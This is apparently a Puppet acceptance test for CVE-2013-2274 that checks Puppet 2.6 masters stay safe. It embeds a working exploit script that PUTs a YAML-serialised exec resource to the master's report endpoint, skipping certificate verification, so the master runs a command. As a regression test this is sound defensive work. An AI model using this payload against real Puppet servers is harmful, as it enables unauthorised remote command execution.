test_name "CVE 2013-2274" do

  step "Determine suitability of the test" do
    confine :except, :platform => 'windows'

    versions = on( hosts, puppet( '--version' ))
    skip_test( "This test will only run on Puppet 2.6" ) unless
      versions.any? {|r| r.stdout =~ /\A2\.6\./ }
  end


  def exploit_code( exploiter, exploitee, endpoint, port, file_to_create, key=nil )

    certfile = on( exploiter, puppet_agent( '--configprint hostcert' )).stdout.chomp
    keyfile = on( exploiter, puppet_agent( '--configprint hostprivkey' )).stdout.chomp
    certname = on( exploiter, puppet_agent( '--configprint certname' )).stdout.chomp

    exploit = %Q[#!/usr/bin/env ruby
      require 'puppet'
      require 'openssl'
      require 'net/https'

      exec = Puppet::Type.type(:exec).new(:name => 'touch #{file_to_create}', :logoutput => true, :path => '/bin')
      yaml = exec.to_resource.to_yaml

      headers = {'Content-Type' => 'text/yaml', 'Accept' => 'yaml'}
      conn = Net::HTTP.new('#{exploitee}', #{port})
      conn.use_ssl = true
      conn.cert = OpenSSL::X509::Certificate.new(File.read('#{certfile}'))
      conn.key = OpenSSL::PKey::RSA.new(File.read('#{keyfile}'))
      conn.verify_mode = OpenSSL::SSL::VERIFY_NONE

      conn.request_put("/production/#{endpoint}/#{key || certname}", yaml, headers) do |response|
       response.read_body do |chunk|
         puts chunk
       end
      end ]

    return exploit
  end

  exploited = '/tmp/cve-2013-2274-has-worked'

  teardown do
    agents.each do |agent|
      pidfile = on( agent, puppet_agent("--configprint pidfile") ).stdout.chomp
      on agent, "[ -f #{pidfile} ] && kill `cat #{pidfile}` || true"
      on agent, "rm -rf #{exploited}"
    end
  end

  with_master_running_on(master, "--autosign true") do
    agents.each do |agent|

      testdir = agent.tmpdir('puppet-kick-auth')
      step "Prepare the agent:#{agent} to exploit the master #{master}" do

        # Ensure the agent has its cert
        on agent, puppet_agent("--test --server #{master}")

        # Double check to ensure we don't have stale data
        on master, "rm -rf #{exploited}"
        on agent, "rm -rf #{testdir}/exploit.rb"
      end

      step "Exploit the master" do
        # Copy over our exploit code and execute it
        create_remote_file( agent, "#{testdir}/exploit.rb", exploit_code( agent, master, 'report', 8140, exploited ))
        on agent, "chmod +x #{testdir}/exploit.rb"
        on agent, "#{testdir}/exploit.rb"

        # Did it exploit the SUT?
        fail_test( "Found exploit file #{exploited}" ) if
          on( master, "[ ! -f #{exploited} ]",
             :acceptable_exit_codes => [0,1] ).exit_code == 1
      end
    end
  end
end
